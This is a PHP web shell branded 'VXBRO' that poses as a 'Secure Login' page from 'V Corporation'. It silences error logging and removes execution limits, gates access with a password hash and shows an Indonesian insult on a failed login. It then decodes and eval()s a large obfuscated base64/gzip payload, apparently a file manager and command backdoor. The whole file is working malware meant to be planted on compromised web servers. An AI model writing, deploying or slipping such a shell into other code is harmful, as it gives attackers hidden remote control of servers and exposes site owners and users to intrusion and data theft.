<?php
session_start();
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

$password_hash = '$2y$12$JQV1GnO8G9HZ09/pJyRk1uaTWSMEF8ygOAIkfLj9tt8./dZXV53Bi';
$default_action = "FilesMan";
$default_use_ajax = true;
$default_charset = 'UTF-8';
date_default_timezone_set("Asia/Jakarta");

function login_shell($error = false)
{
?>
    <!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VXBRO</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1f4037, #99f2c8);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #fff;
        }

        .form-container {
            background-color: rgba(0, 0, 0, 0.8);
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.3);
            text-align: center;
            width: 100%;
            max-width: 350px;
        }

        .form-container h1 {
            margin-bottom: 20px;
            font-size: 1.8em;
            font-weight: 600;
        }

        .form-container input[type="password"] {
            width: 80%;
            padding: 10px;
            margin-bottom: 15px;
            border: none;
            border-radius: 5px;
            outline: none;
            background-color: #f1f1f1;
            font-size: 1em;
            transition: box-shadow 0.3s ease;
        }

        .form-container input[type="password"]:focus {
            box-shadow: 0 0 8px rgba(153, 242, 200, 0.8);
        }

        .form-container input[type="submit"] {
            padding: 10px 25px;
            border: none;
            border-radius: 5px;
            background: linear-gradient(45deg, #99f2c8, #1f4037);
            color: #fff;
            font-size: 1em;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s ease, background 0.3s ease;
        }

        .form-container input[type="submit"]:hover {
            transform: scale(1.05);
            background: linear-gradient(45deg, #1f4037, #99f2c8);
        }

        .form-container input[type="submit"]:active {
            transform: scale(0.98);
        }

        .form-container .footer {
            margin-top: 20px;
            font-size: 0.9em;
            color: #ccc;
        }

        #error-popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(0, 0, 0, 0.9);
            color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.3);
            text-align: center;
            z-index: 1000;
        }

        #error-popup button {
            margin-top: 10px;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background: linear-gradient(45deg, #ff0000, #800000);
            color: #fff;
            cursor: pointer;
            font-weight: bold;
        }

        #error-popup button:hover {
            background: linear-gradient(45deg, #800000, #ff0000);
        }
    </style>
    <script>
        function showErrorPopup() {
            const popup = document.getElementById('error-popup');
            popup.style.display = 'block';
        }

        function closeErrorPopup() {
            const popup = document.getElementById('error-popup');
            popup.style.display = 'none';
        }
    </script>
</head>

<body>
    <div class="form-container">
        <h1>Secure Login</h1>
        <form action="" method="post">
            <input type="password" name="pass" placeholder="Enter your password" required>
            <br>
            <input type="submit" name="submit" value="Login">
        </form>
        <div class="footer">&copy; 2024 V Corporation</div>
    </div>
    <?php if ($error) { ?>
        <div id="error-popup">
            <p>SALAH JANCOK</p>
            <button onclick="closeErrorPopup()">Close</button>
        </div>
        <script>
            showErrorPopup();
        </script>
    <?php } ?>
</body>

</html>
<?php
    exit;
}

if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $password_hash)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
        login_shell(isset($_POST['pass']));
    }
}
?>
<?php
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
$Lix = "FPRRr\x42\x63DhU\x41VHg/\x423\x2bvT4dx/2pzmmtN2svkd3P\x43KX2rL\x43lGk\x63nTE/Nv\x63\x43KQlFRi\x43w7U5EZyPT3EkLR6p6fLO\x63Et/w3\x2bt\x42SHeJz\x61pfNh\x43Vni\x62oO/\x2b7ee8\x435V0\x41E06DjD\x63\x63G4K\x41X1kJ\x43nJ/zsw1fYtl4d9MuvKzwsM0tYW5UPxvj\x612NTDEXppKPtJm\x61\x63FM3vu\x62oN\x2bDdnJQtkT0FznToVV\x62DMLjwNIw\x41t0GfO\x2bisPhRT\x42f\x61FXK\x2bS\x43YMjE\x62Oex6\x41\x41\x43S89Zef\x63ukd\x43YvQh53K\x43UkpiJdP\x2bz\x424ipgIr\x2b6fPyQK2fQ8yerYfT\x612rQpHWrKQrX\x41ndENx\x411UdI\x2b\x63\x42d/XGODE7\x2bQoG\x63GE\x2b0knwqZ3\x41OlgowwWnZ\x43imodU57W\x2bwjGU\x2bk6nIl\x63RLe52inwiFFSHLv\x62pkX\x42x0L/1SIi4Qpzr87W\x2b061RX\x42\x41u/G7\x63\x2bg5/Z3\x420e2k\x42tw8x\x62ef/ln\x42ke02S2f3\x439\x43\x2bN6\x416Dtv\x63MRh\x41fyDToL\x61TOOVUGYwpk/\x43zHOo356\x2be/3O4Tdk56\x43r\x42J\x63/6MpXRknU2Q47HVdv7Q8LhNfgfLWMmW\x62n\x4229nhUe6gqg7XukRwENKyFe\x2bnvhtdP9zJEh0kWIEqZyxyXq3/zE\x43t/I0Yh2\x43L3f6F0jR2nNtgj/iHfHH\x635sIzE5KoIQOLPXw8nHG358PELFkN2ZvWVfT\x61\x2bf\x61\x43veP9Sw5wzvT8sfSRupwEm1/do1\x2bu0Qr\x43\x41NG\x621/X42ijSVX7kqQGOVuLT\x2bw\x62Z\x62\x41S\x42r/F\x43ZUN7\x62yYOPgxEk\x63pe/vOhdk\x61KM\x618NIifJ8\x43K\x61IM1tQdmwQ4t7VDW96MX04\x42\x62VJVDLfDIK3\x41hx\x42l0Hu\x2bJM3Wj\x43\x63DvT6gx/dfP1riq4HedDkF0/hHff0Z7fo21UVIL8Xsd6g/ht1wRp\x2b\x2b472vN\x63IVRqZSv\x2bw6ZH\x61Zr\x62\x2bWHr4ORhQu4OD\x42zoqKvUNkHghXU6QR\x63diPKN9SIWI\x43GoLh7UI1UQ135VPdi\x41qK\x41\x2bzdJGjjMSweMqn\x63MlzDFUdjrd\x42S\x41I0Gx3GIUxxvk3NjQ\x62mvNdL/2YfyXT9hrhmiXl0P\x42T6qUwWfSu2t5g3FMmFmFo2z0y/KYT\x62l7N0L49QEzkIJ8WZU1h74J\x61\x639LMXgNPW\x62KkydF4JtrY9\x61\x635Z393ih\x42\x63mU7EnYN\x410SLG8/Ios\x2bYP/D3l34fJOPlsl6Z\x61LHH\x41xTFihjDfWY6gl\x61tpq\x417mh8/O8\x2be2qrot\x42PsK\x2bfp\x432TY\x43WU\x41\x2b2x5vQP/\x62j\x42\x2bl\x63g1dku7on\x432hJwD4qxQ/7S0uitfK665\x62oyVf4\x61\x42P8mzx7Ym\x43lzx0W2/VYOl3eyeKx\x2b\x61I8/x\x41\x43fDo8sWn\x63dLHzn\x62\x61T\x43kTk8gG8K4wS9\x63VzUQJr7ppi2UKDG9QZ\x63jYF1xuUFSJ1vVVVW\x41w1qtKl00RdD/Sk/qFHj4mYwI\x42elo2LkzSDZ7d\x43n4qleURORU\x2b\x62dE\x41YiPXd7nNr9R6\x61\x615Qr6ItRlwpQYIWlt6kVEJ9/\x62ZKdq0xG1pKWlx7pqH65n\x2bGT2h0e\x2bdo\x2bXRtzIe\x42H/nJ5rWznxm\x62HYn5kHhS/NG4R7jDMW9WzW\x41gZEx9njEzxY\x622Ft2fKZvzL\x61i1\x42d\x41vVnx5Qt5J\x41kEug\x63\x61\x43LK4\x43rY\x42IO\x42Ejt3EoY\x41\x63q\x63NrK\x41\x42VlfR6NqkhP5lf1VOWHeikuj\x41P\x42K6Ved4i8JyT1hlw31y3NTT09xF\x63pq\x2bOU2RKsO22vke9o\x61\x2bjS\x43PV2hSvz0WdXg9Z0/\x2bkHt\x62IXeV3p\x2bdP\x62\x413IW0\x43xrToKN\x61J5lu\x43Q63SIRvu\x43pmdkOvKH2qJZ3\x61qLlopZZKuTgrhtTGSEDoZ\x63Fw2V5Io86llxx\x62621f\x434Q2/XWdp\x413OZpx\x2b3DmWDx5\x410oiN3G\x2bK\x43\x62QyNOpzsLEW6R\x43\x61u03rELhK\x42iqfY0ORlZEmU2RkRvN\x63rjtr1itF\x61\x61fMYw\x428kf\x63\x42VpgLmUzqn\x2bvUoQpUvyu\x611Now8zPDqu\x2bxjz6f5N1mizLNZSD4v\x2bvJFUVl4RGSOLFtEiljgZG3UGZ\x43tPoIImKjR\x42JzvUumL9HIZg\x41ktFIpFP\x41so2I3MrH4\x42PS8wnleOOQtJ\x63LhyseT3dG2h1M6jsKFvFF1ZPUUkVMGmp6xs0SOoIvhfMoSOFyfrjDQEMDEOInxWvlpo2l\x43ydh82vu0\x41KuJdx2Lmo\x62H/\x62Up8go5Kjf\x433q\x63mJZU\x636pZHJxj\x62JRQj6eU7OO2hsZ\x2bvL\x41LY5ewDI4\x62LP6LquldIdVhK\x62wnTHj\x62Mzd\x616P7\x61sgdmLs5gfp4n\x41H\x63gtE\x2bg\x62DoPMe51\x2bse\x42P5DTzeo\x41wsyx\x41TNf8\x2bKkksx6NKxmffgQV\x63kW8ZG8\x62sFYK\x617\x63piMLkuv42Nz5nIl\x61M1Hu7R\x42shEz8xN7tUWtmz\x61ql\x436\x63QXvR/J46hGWug\x41Mr1sr\x43\x436p7G7WKV\x42T\x43rjLnhUM8FPro\x62\x2b8/i6DLEr\x62kF\x61\x61Sgpu\x43h20VW\x2b0LKMtPRmG/QXfrWm72086sN3\x41\x437dNs/LP7\x2bFk6GlSr0\x61\x63eVgWrOg\x61IZeGUDp1yfj\x41O\x42o7OQFd\x43M\x2bSuZIjERq51Fk\x41KjEzR8IV\x42frE4PKUEMuFwivPeuop\x2b\x412WmueE\x421EuN18LS0Ns\x62KjH\x41kroszoHtR\x63Om18mwS\x43yPkLNHE4p1Fx2hJdNoL\x2b/K\x41\x42k89\x414k\x43XLN/f2y1zu\x2biZE\x2b/zp87fe5YHk\x42hofS40S3Ld5\x614j7O8p1zYmVO3pOwjoU\x62\x43sowz\x41PigyQyYKpW7j8\x63RLKv2YNq0wsLfog0yy3K9gK\x2b\x62YyI49EIqHzrH7s\x639uZyv7\x41gKn6ufkXWq\x62iyvn\x414ED\x42\x2bQ7K2\x633K\x421J9yvrhWy9O7W5vDn1XQ\x428Mh\x61H\x62\x421QvNdqte8r1Rpjyu4dZpiztjElVw9dPEJ3EIKj\x2brr\x43zxHrvyqO2QK\x6220krdSTqZ\x61Yyd\x62\x43nU\x2bzJi\x61xd\x42DKI6LOe0mE\x612xWzOpMR8oG9\x62N2F4sLSrXS\x43ymw8\x42ZMe2\x612ZiGFxrET\x61DOFtOfS9Z3y02\x2bmiR\x626EOJ42p2m6\x42q3erft1Jy5\x42hT\x61ydN700wLOT7whRwWsT\x41RKG901f\x41\x63trdntDFJqvQkW\x42F79hhns9O8\x2bdtT\x2bV7u\x2bp2K9RNNt5fWIOvd\x62M4\x62Ok8\x61LfZfemeiR\x41nXnMOK4uJLeJ\x43EtUEXGuEhZj\x631/85Q8Mx4j6W8sK0Uy\x63N\x62ve0Eyh8uJ2V\x61Uuq5\x43fm6\x4381dOyVITvgjF\x2bq\x42upzXS8Yii\x61\x63y\x430muV\x41wRTNhGF0Fg\x62OJFtG81tmv8RH2d\x62mOHrYuX2N1\x63rNDNXjNZ1RI0w6vm\x2bWI\x2bE2TV2lWQHlw0rfrHssEZGkoFl\x43fSSsUlOPKSnnIkvG\x62\x42Qu1\x41Gd4mx\x2bYIz/tw2T4K6Ow\x61dWdV2yIx68LG0t\x62RY\x2b1lGtQk2ejf85heo4sjqTwg9\x63RVLN8TWVRRiyNrpmskdr\x4325hhqhMNyEF\x62\x42xxDhI27FFmDIzLp\x430wQzM\x2b6FFLo6umv\x61\x2bJPX\x630535j2TQTvlstMpvo8IeT0iyk\x616\x61rkL3S\x42kshk\x63qsmoxerYQd9k1\x43yWmG8FKJl7\x61ETNFZUxLt4elnlW1MRTFiR6nXg\x42h\x62N8of5\x42Zm3t4\x41EF1qyUXX3rxnShqZ\x62q\x42dVu\x41KEH\x43JXtFxQnmK0nmV\x41oluuOrKGKRlOxX92xKFN8vKD2YG\x41UqNJktvwqRluZ\x63l9FE6\x63WQDNS2xXuGlyqIpo9uj/owiwh\x436O\x2bST1UG54yUpSlO\x43lq75KVHO3MduVSNgi3YGr\x2b/1jQ5\x63mTfGRp0ym3OEDt8Q4\x43rxLr4ZhNMeYEyVOkq0PQedYFhz94Y\x63\x417Ys\x43v1u0VVO2R6x\x43i5OEMOOog9J\x62i/\x43JXX32FMiX/n\x61M6o2j\x439e8wRW\x43u\x43OK5oKg2FT1Eomtzh0RLPDvP\x62MkVHGF\x63J0WjUE\x43GVGgX\x42OkTgJZOP34\x2bxm5khVyJP00\x43erLSl/5o6tN7vK8zIwOnRm\x43poRiTJFQ\x434gR\x43MzS8YrI7GuJnRRzvXQn280V1sY\x41kvWW7Xjy1WOfldj4hq/U/\x61\x41\x616hRkn\x414\x63D/LEGzTjeE\x63dp\x62h4k\x2bMyhXSPuMxsPVSjyiFSD\x63YMDMVvSSRojhKJPZV\x62fptYOxRjWs\x62\x41u\x43WFU6T\x63KQhj41uSxGJHRTlYk9MU0VSG5\x410t\x2bYy\x43\x43j9vXw0\x41yNd0UkUZGMHHDZUF6FZqYNZ\x4176ZP\x61PynU\x62YXIMjUgiqLP\x63\x61ZKe\x41U7elPJi9IetNOj\x418\x6235gov\x41d\x41EdihLU\x43wwiopK\x63s4kx\x2bP0FD0z\x63z\x43WdKVrMiSUmGlj\x42nmeZIi36PfS7E/5qHKset7\x62\x42\x61hjN2S\x63K\x63ui\x43zh\x41q1\x42un48L00yz\x63wYod\x61pxYS2\x42lwXVJU\x43Z6lmh1\x43iyW8ILXh\x63UKMr4TO889\x41gSHHgKDQ\x42f\x43MNFUlwi2IklrSi6ENhvx8XPmjvP2lM\x61m\x62\x2bqKhUOYDU\x62gDZ4S4pFO4\x2bFW85J3yT\x2b\x63/RGT1JUEHZRNJNR8\x41K\x42m\x62RVyzH\x2bZje\x2bi5i\x42\x2b5ziRdxKx96tj1E2VfOSo\x2bK9Zii87E\x2bDDlU\x41tS9GhleUxNM\x622XJjUggDmkOOIpz/i9t/mk4tEFt8Z\x43tFQkWPgG\x43T0MM9\x415YI93\x2bXl1P\x62oGd\x41GdVhohrPEzxN\x2bXI2kl8nN8NKsi5\x63wRkx\x42P0N7Ov7oR2ER8k1MNui\x41TYM\x42xQ\x61Ug2F/LO6FjsO91NFj5/k25LiVIij4NNE\x41I7u\x61Tfx11//QG22m6KIzd/\x42/5\x41L\x41\x62f\x438Ki\x43w04tWuIvfyK75L\x62u5GuMQXZpDR0dH0\x42L\x43vOEY\x4121\x2bOuX4PR\x61M3rhLLnnIDDDwk6\x62\x43x1n4\x62v6\x423wJ9Xuk1UofT\x43R/H67LoTEyWDdQ40wLIjf1\x43F/E\x42\x42\x63\x41jH\x62urYO\x42eW\x62Ts7M896lM9o\x63XkS\x62d\x63jUj3\x61\x62LQ8RDYvTM\x63\x413PY\x63YD8gSnIyHH\x2b7m5t\x2blsre\x42wWpp0rQ95fepm9PgNIUgtNv35e\x43g4dxV8n\x62T/3/Eqt3dPq\x61/n6k3qr9YPo\x422x77\x63zZWD6oX1deo\x2bPvHE/xi\x41m5xToJ99P4HPTqDhHRWG\x43XuINS\x62f84ZLOIilHGF\x61\x62m\x610mWG\x425f05He\x2bt7e2ZsUm7Rx\x41Xro\x417KJqSDGfxZnez9H25yTgU51V\x614/f\x2bevv0J3dv\x2b2fk9fWJ7P4u/XIliEP1jhl1KgTf9XsQOJEjHlOeh\x61ir\x42JeYuFm\x2bITNnnoKTHGmD\x63\x410\x2bS26Xu/2R\x63jz6VEl48uGNk\x41\x41wkU5TzihV16WPSHZ7WniLkTf8ewGtf6n6e0NPTQTwVu3UeIz\x43s\x43\x41xJWsvmd\x2be3s88/fx5ImY6Uk2v14\x2bjfM\x61sFPjMKq0hmu/l7/vWE\x2bGr2yplJmf2ZHfwR3fv2G/i/vXLu\x628hnf6OX\x62J5xDF3f/zOUI46TfntveP48T3\x2beLV8hQMRP\x42Ni16jZQsuVUG9Og\x43Vf/0QkjP5wL\x2b4dVflRT04\x43h\x61\x625qu03D6rRUwM7DE7He\x2b3eS6O/tkvjqUW\x41tvEWJ3JjIj\x63FQULKsF\x43\x61dugNxsg\x62PrLQg9mKOGsKU5Einthp905zDzrn\x61Gy8\x43rojO43VU/G\x2bT\x63dk00pzt\x63IwU/ig0\x42E00\x63s\x42mr\x61HwoF\x411kVwoi/Yu5lxNU\x43S3jZx0zWQFRqyNSiE\x62jSvOgRSKX\x61HR\x63xtZSoTt9kWLnGU6Wyd\x61uOL\x62SEps0\x61Etoj\x41F9XEq\x63K7O/17R\x61HwM3UYTzKukLv5PrZrXWzZ4YYr1NUyGo\x63\x62n\x61yIKi\x43Q\x62n\x42jXHrO\x62o\x614Qn/EvZ\x61eskNRi/j7/oUl9zyZM7hP0MX0HyLy/4y6no\x43xEKYYZ4\x62t4ym3t5F7dvp5GQL\x62vVWues7JshlpVyIYoRxlm4Yw\x43HYY4kJtlLyt34uv4ZID\x61gnh\x410iveNUQ6m7Tz3MTvoWW4Y\x63K\x63D\x43zmN5\x43msnhy0llQY\x62y\x2bRo\x61YnhUKhwyKtg8\x61l5\x42w3\x2b8Vs2XYZgM\x634piFkRrKrIvz05w\x42Rq3GSOTDtl\x429804t\x43Hw\x43j\x41Rg1Rfqgy6q\x4107nJ\x42K10\x63Kt\x426pevT4hFPzqQrJy9gHd\x42QdpLtR02h40IfYdmyi3\x43Zp2NnQlsF\x61xz/okLItORmFPxUVzp5\x414PX3GoRtO\x41\x2b\x63oqpw\x42EyNFnds60xuiGvPXOulvogxyMf4P\x41\x41eW2T2/xR79S9e0R68\x2bNy0WuSDe1JexGUGf\x61x2zpUFiM7hz4rq\x420EWgO\x61\x2bjiILrp26l/\x61LtwTXYVYWmlYP0H91X3Ix7v9wum\x63rM\x61\x42\x41ijell8L8d5\x61ygPSLkuIesPM4V1jzUJOEWLHxT\x42r\x2bn8h\x2by8S\x63IZ79\x2b4RShvVzIL\x420X1Sso\x61uzHz2z9\x61yTogsGFHJoPj\x637\x2b\x43LiSidm1H3oO6DiYZo1gk\x41ljFDkJJXyKDVd\x2b\x43vuJg0F/uE\x43\x62nhVFIuwi7zjVJw4q68P\x43f8eVFtu\x62VIpOpU9nXj\x41fm5MjID5P9M2zQXedq4Jz\x63oLtVwN7ixm2\x622GUfhHh\x42pO\x41IedVVWDU08\x2bFQ8lNSHN1FRSeuNWJUv\x62LdyMVQqHeN\x41\x43\x2bV\x41RPIEwG7i4SzyqTOpxqmikRlYXtkHL\x42d6/8SnSf\x63u/invMU0O\x2bSUHrQdFmZ\x63Je\x61GrX\x618NTnw\x41slVsU0t9q9/PW\x437KNWzPJVWtzU\x43rOen\x63n2juQRXw0N8NDnSJS6FSSVOmGPvGJ38dJt\x43NhDvU0zs/0\x62lJ\x61uh42/IMgqTTYGKG7\x42\x42ko6tuMU7zjgFloG7h\x62r0R6Q/U7w2KeK9m\x63gn0QHx7t\x61E4TfR7HzpE7M2Uy9k\x632tPJUTPrp\x2b8h\x62IgTJlzTE\x41v3IUG\x62\x41IPyq6\x2bUENl94ej2V\x61NiSkgv\x63fPRhZE\x62oSxHmoK\x427Kx4ejpkyHgYlr4yemQMw\x62uSdzYxGD7ndE7\x41DEZI/qjd\x41Sh0M7h\x61vyn9uQPUSJ8fZSzyYO\x625MziZsg7YUJWNeMYGI3QNU7\x61M\x42\x61T5WzE\x41nwXIPfX\x62p1uT2\x62wJ\x41THJj\x423\x41DihXUU\x639SFEl\x62ZRj\x63vkSMp\x62J\x618vof5/lR9X9g7LJXzy96qD0xfWVeH7YGMl858p\x2bEGdH0fIig8Zn5RvTn5kH0fIjY8gv8\x2bPdss\x62P5vtWo\x41kHdX7kiIFf2\x61pMZX\x62\x436m\x42PoM1HjYwEE8l7io\x42DGgUE8xLwqUWoyrz\x61pg3xfPkRtHGtm\x62dFuEQnyFj1p\x41m5OJT\x2b5GGM8wQkKxey4lsLsJwFwSSqF\x63\x421\x42SugLrvxZ\x42i\x418Tz\x43JYISy6M11Tt3\x43Ekx\x61M\x41eW\x2b3ULoSklUmEFsjK\x63Zv\x63KlRpYV21\x63zYDKEustsf\x43iXgu8kiW6F/s\x63oySxYSn6lyKqgZRldg7OuIF\x2btgdUru4u/51Tuqv\x2bo\x43QHJ\x63ZW7Jm46r5N\x615\x63MW\x63ooE8RUQHHXEVU89dyuIQ33uHNQyivIyMtTS0ShviGS7q20D\x410\x42\x62dR/R\x63MvmmGuz\x42\x63z\x62GJ8e5pSGRnosskLZ\x41HIHlZEFzML\x43NTV\x41lttr616km2DjWXLg\x41iOmg4Q7DWyk2O8dMtMD8F\x43SuYwYUW\x2bOvpUk7V\x63U6JJ6W3SPw8T39kYjO92k8G30We\x61HVt7sHYQQoh4P6t/Jv7f9VNDFupFt5ZRgv\x2bQT\x43wSkGt\x43XNOX5\x61M\x41j\x612DrLFPOkv\x63r\x2b\x62INRSDrUVYsJyuKEl3wilp0E8ok/TswxHpwEFlx5RTudPLkWPTMSuuuekqoQNkdp084qqWThopIodkmDLwOLp\x41jkuoqk3\x63xZOV\x63q05MyWFF\x41\x438\x63no5ZpY5ZiSeolQTw8\x63Jt0YL\x41g4\x2bXsGEJ\x4376Ulr\x42v1tf\x63\x42\x43PW22RFhMZU0hnxVj\x637tXU/eHuYKQ2FeqGrSG7zdXXg\x63H\x416Z8/YrIlDwq1VXfRd7hq1hRQ4U1FUKdeGVhG\x61I/5qEiGw8q\x2bZPSzpI\x63r2f6mO\x2b5\x61Y\x41Ed\x62pojTzJwST4vo6iosUGS62\x62VKXY9ELKIYlgjewP99n\x423kML1ZKFJMhRvs3lRR91kNH6283\x41d0kRjpfjl\x63iPQzt5uxOXW\x63mIk65TnQ4UM2F/\x63O\x633p7yNRWJE7LkK7isN6OvN1I0y\x621qd\x61z3V\x43oD\x61nQ\x42eU4GnprgOhstVWOFv2E7\x2b\x628\x43qoH8\x43rM\x63vX\x63\x2bZyPzLD10IHIn\x41\x2byLRIkIgwZvgK\x43hD\x62YKLlMJ4x\x63KoD8ojM\x62eh7Hof0mu\x419Tm8po\x619WDY\x43l\x42XFssixnxhPjDoVG\x43evG8wSvZlN5nKfYR\x41ZLEDEzy6UxU3\x41I0KeMEqK/YYmwJR\x2b8LIqJt\x61rqKS\x41y5vRG1I/QWpUyLlMdK6D71\x62M18J2\x61Qrkh\x2bQNS\x2bJ3pZyM\x61EghUte6e5ZXyDXlylsXfmy3m8RPSj4\x4357wTQkH4qx8y/r4mNsYMTSrGJNdYlYktn\x63K/HIy/v536Drf\x2b\x63\x41GksFvwEq\x61RNvXORtM0\x2bf\x416wF/DOdGxlT\x41ty9KwM\x61eTdVXg5kYZ7lWZnz\x61v\x2bhnEUpsIhMOLkOR3hpZST\x63gj\x43RhGVRH\x61g6dSm4h1MmQ/Xh\x43xKzd5zosy8q1Ss7VxSK\x42ssEXRZWeS\x2bvyv5pqsKk7dW4\x42rQU2v4\x42iFDhZ3mpkuuGlJQ5JDWE6T/\x43\x632Q7J5RV7M\x427XuQNv\x42eMF2VQeMLtPV4p\x620i9\x42IyslhgwmkjeT\x41IS2gv9pL8ojOwXhOwXh3S\x43YdXDw81rWt6Hts6lE3HmOTPw\x61wgGXgKmn9z\x2b\x61tfpxzHv\x41H9kH\x61J\x41rg\x62EKn7\x42\x2bghuW\x61rmHQ\x41\x41vwQXerqLFjS9q1HPIRVQfmY\x611Uw6\x61\x62hzX9MGtWrzlsj\x43qHgY9V7gq2HYmr5koHRV\x42quG3\x41\x2bK\x63d\x41/NfO4/GkXl5V0ZytM\x416G\x2b\x416nV\x42y\x61\x615pRxGOm\x62oRQ\x41LYg0yxPt1eEFvZFYI\x42GWZPhLI5f\x63wIo8HyM\x42x\x432\x632ETLK3IX2I\x41xdgW\x41Xj6P\x438SwoSVLvh\x61MN\x43rFlV01oeOM\x43tz4KSl9GDrWvf1omlOzrW1VOEmz2mph1VVLfTdut1DtrsQhjMMO1tPYR3oKmVNT1uR/\x2b\x2b9\x63f/Sef/eqPww2x6IdtGK\x63\x41/QoPqlmR\x42q\x42vrq\x62\x61Hi9jHtK5wGdQtYK\x41UuhmV\x41p4pIMK4hRyfmKF0J0KKTQo\x413F1nQrTY2o7HUrLXJ23t8\x63U\x41MQNe\x61KhT11r\x43jEprvyrUxFJr\x41GrMq4NvDl\x61sk\x43WO5t\x2b\x43IgHo68VrX/xwU\x41g3rf3zjYo9\x42OJsesnF3\x42VH\x42UjWVHJ/NMhO9K0HtfiM\x62HQ\x41X93i\x42TwyT\x420nFKdL3hhzxW\x435rq\x41JfkRq\x41sGw\x2b9fDDVT3g5G34\x43D\x62z2PRmTmvLoWGsV5l8\x62hWx\x61\x43k\x43\x4300gKk\x428KrUUkTRyfLS7J24\x43\x63\x42\x2bWUoWulHR37P/L2USw1\x42kVqIx/EqYOyT\x43PENFQPgQ3M\x41/1Ixj\x2bXRLvH33Dt0hIqDED5rI0Y\x61\x41d6GuEP\x41pu8eSv1UiuVH1uz\x41IVdlVN\x63\x2bXw5Guf8qYPpOT4VZW\x62hr\x43sHF2Y41VVGWn\x2bQsq\x43jWivfnz\x2bvR66P4vOWg\x432\x62ghgnwOZwV\x41x9d04rvu/ZGwqHPODWfKD3\x2bHQlZJ\x63MEt8I3w2Md0ZZW05Zk9NX/pog\x41Es\x423N9\x43Nlgoji\x622\x41RJ\x43N703WiHsNHOVl\x63U3ei0\x420FT5\x42OuFPp/TZD3pd96i4gKlG7rDLN8\x41Gjp/nPgMDxf2qVrI03OTq9HvujHsEq\x63oz0fxE2s7nh\x63HD3Wwmv2J\x2bgD\x62Vf3X4K\x61G\x62\x63ztX2\x61YtJx9j\x626sOqzyF\x2bg96Du0Vj\x61\x41kVFzv9\x2b9XeG04JtX\x62IUHuo/8\x42ikM8Z4\x43US0Y\x618eg8Ewve\x63GmfUjnYhhxkNhM\x61vpkY\x41QlDw\x62\x62iUd8dEs2x68sj34ozOYnTvdgOO2UVgI3I\x630L\x2b75ltz36js1M6w9vu8I7Tx\x423M5kv2pLgy\x415\x41MgVqYpG4gr/Omt/kku\x63o\x436TRYr\x42O\x62Xf84WrNXkPxND6iNrieyM7fkrEg\x42LViRu5Nfv\x2boSivytmlkd2W\x630H8SEEs6P\x42HNe1QD\x41inMh7IUToFeUJRr9jt4PIhSz\x43JxNdUnVTEjxKW1Nef89Us\x42ZTG3vINR0\x2bEOo0EkgH6HWSvyzpqnR8EK\x42\x41eX0/P8v\x41dl1TU9\x43YJ\x2b65i83jZ06Gi\x41Ngw\x42EY\x421/vuTwoSrJrGY0QQ\x2b74\x2bvKGiRxSgGNkk/g\x2b//U\x2b8r1E\x42V\x61L1q9P0\x2b3X\x43vG6TDKzy\x42FnZVv8nx//fi//37//1\x43RQwYE\x41M7vR3I2nFL\x42\x62gIwEY/R\x63I9wUeVG\x42Gh\x61P3tRoyvm8zEpE1I5tZxGTZoYODhQYGEWFrNQ9\x41f\x61w3WPoi\x62vOd73ofnWsO7Pjxv/7EP8\x42dEx\x2bPFYRq3s/Hz6Uh/YU9\x635x7p/jve\x2b\x42n\x63ou5OKMe5/\x42N\x43dvVJ\x2bO\x62/tf/QN830/1jO6h\x617qf\x61TY81H\x61D91Yd\x42me6x7fvHt/l65gs4uz24tD2/VqfQnn6\x63pIOgHPI\x41szQm8k\x61DY\x43wiuEqvVnHSESnHP22\x63iGYWZSzxj3vsymXPrNd\x42S\x42//P\x41T\x63\x43sU\x61D9m03POZ/rGOx\x42\x61u3/vu/D2D/fr63XO\x42//O44XTsjD9/7nP9k9s0GPeePto6vXPi1xkqdizHh/58x/XVM\x618sHMudmgo54TOZEDe\x62E6kH7xx7RuW1\x2bxjHwEH/y2FT/\x2b\x63pT/\x2b6Swx2h\x61lzuVPU\x43ZD\x61Qj\x416PHkfK7\x42k/typmx8lVe\x62Ul\x61tlk0zhQO7\x42zYS0g\x41L6\x434\x43\x41ySVS\x61kVKXSlZ7ZyjIJ26u5YJTkXrUT\x41\x61nLt/Ivrv\x62HS\x62L3290e4\x437RP\x42wJehfrHIFQ4y6RT\x42wJehfqHYFQ4i6RX\x42wJehfpHoFQ4S6R\x62\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
exit;
?>
